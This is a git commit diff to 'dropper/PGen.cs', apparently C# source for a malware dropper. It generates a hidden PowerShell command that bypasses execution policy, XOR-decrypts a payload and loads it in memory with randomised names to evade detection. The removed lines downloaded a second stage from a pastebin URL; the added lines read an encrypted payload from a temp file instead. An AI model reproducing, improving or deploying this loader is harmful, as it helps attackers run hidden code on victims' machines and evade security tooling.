1a2bd4f5ffd0015f970b0db605d32d62a612afde
chash <70506265+ch2sh@users.noreply.github.com>
2022-05-11 19:27:24 +0800

    Add files via upload

--- dropper/PGen.cs
+++ dropper/PGen.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Linq;
 using System.Text;
 
@@ -6,18 +7,18 @@ namespace dropper
 {
     public class PGen
     {
-        private const string payload_uri = "https://pastebin.com/raw/LLqxW7MB";
-
         public static string GenerateCommand(string token, string prefix, string geolock, Random rng)
         {
-            string xorkey = RandomString(payload_uri.Length, rng);
-            string varname = RandomString(6, rng);
-            string varname2 = RandomString(6, rng);
+            string xorkey = RandomString(20, rng);
+            byte[] encrypted = XORCrypt(Convert.FromBase64String(Resource1.payload_data), xorkey);
+            string temppath = Path.GetTempFileName();
+            File.WriteAllBytes(temppath, encrypted);
+
             string srcvarname = RandomString(6, rng);
             string classname = RandomString(6, rng);
             string functionname = RandomString(6, rng);
-            string xorclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i]); } return input; } }"));
-            return $"-noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};${varname} = New-Object System.Net.WebClient;${varname2} = ${varname}.DownloadData([System.Text.Encoding]::UTF8.GetString(${varname}.DownloadData([System.Text.Encoding]::UTF8.GetString([{classname}]::{functionname}([System.Convert]::FromBase64String('{Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes(payload_uri), xorkey))}'), '{xorkey}')))));${varname}.Dispose();[System.Reflection.Assembly]::Load(${varname2}).EntryPoint.Invoke($null, (, [string[]] ('{token}', '{prefix}', '{geolock}')))";
+            string xorclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } }"));
+            return $"-noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname}([System.IO.File]::ReadAllBytes('{temppath}'), '{xorkey}')).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";
         }
 
         private static string RandomString(int length, Random rng)
@@ -25,12 +26,13 @@ namespace dropper
             string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
             return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
         }
+
         private static byte[] XORCrypt(byte[] input, string key)
         {
             byte[] keyc = Encoding.UTF8.GetBytes(key);
             for (int i = 0; i < input.Length; i++)
             {
-                input[i] = (byte)(input[i] ^ keyc[i]);
+                input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
             }
             return input;
         }
